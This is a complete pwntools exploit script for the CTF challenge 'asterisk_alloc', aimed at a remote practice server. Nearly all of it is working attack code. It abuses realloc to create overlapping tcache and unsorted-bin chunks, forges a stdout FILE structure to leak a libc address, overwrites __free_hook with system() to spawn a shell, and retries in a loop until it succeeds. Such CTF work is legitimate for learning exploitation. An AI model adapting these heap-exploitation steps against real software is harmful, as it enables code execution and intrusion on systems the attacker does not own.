# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './TWCTF_online_2019_asterisk_alloc'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28445'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('choice:',num)

def add( type , size , text = '\n' ):
    cmd(type)
    sla('Size:' , size)
    sa('Data:' , text)

# m c r
def delete( idx  ):
    type = ['m','c','r']
    cmd(4)
    sla('Which:' , type[idx - 1])


# one_gad = one_gadget(libc.path)

def attack():
    
    # 如何让一个堆块即到 tcache 里又到 unsorted bin 里？
    # 大于 0x80 的堆块原地 free 7 次以上

    add(3 , 0x40)
    add(3 , 0)

    add(3 , 0x100)
    add(3 , 0xc0)

    # realloc 可以通过 size 改小 将剩下的堆块切割出去
    # 切一下防止与 top chunk 合并

    for i in range(7):
        delete(3)

    add(3 , 0)

    ## 此时已经有两个堆块为 free 状态，下面的 0xd0 大小的堆块被 free 了8次
    ## 同时在 tcache 中和 unsorted 中

    add(3 , 0x40)
    # 申请在上面的 0x50 大小的堆块
    add(3 , 0x100 , '\x00'*0x48 + p64(0x41) + p16(0x6760))

    # 使用 realloc 扩充堆块，此时下面的堆块（0xd0）被视为 unsorted bin ，因此会被包含进去
    # 这样就能修改下个堆块的头和fd
    # 修改的同时修改目标 chunk 头 ，让其不会 free 到 同一组 tcache

    add(3 , 0)
    add(3 , 0xc0)

    fake_io = flat(
        0xfbad1800 , 0 ,
        0,0,
    ) +'\x00'

    # dbg()
    add(1 , 0xc0 , fake_io)

    leak = l64()
    if(leak == 0):
        exit(0)

    libc.address = leak - 0x3ed8b0
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)


    add(3 , 0)
    add(3 , 0x110 , '\x00'*0x48 + p64(0x51) + p64(__free_hook - 0x8))
    add(3 , 0)
    add(3 , 0x30)
    add(3 , 0)
    add(3 , 0x30 , flat('/bin/sh\x00' , system_addr))

    delete(3)
    # dbg()

    
    # p.success(getShell())
    p.interactive()

def boom( pwn ):
    context.update( os = 'linux', arch = 'amd64',timeout = 1)
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

boom(attack)
# attack()

'''
@File    :   TWCTF_online_2019_asterisk_alloc.py
@Time    :   2022/02/03 12:10:39
@Author  :   Niyah 
'''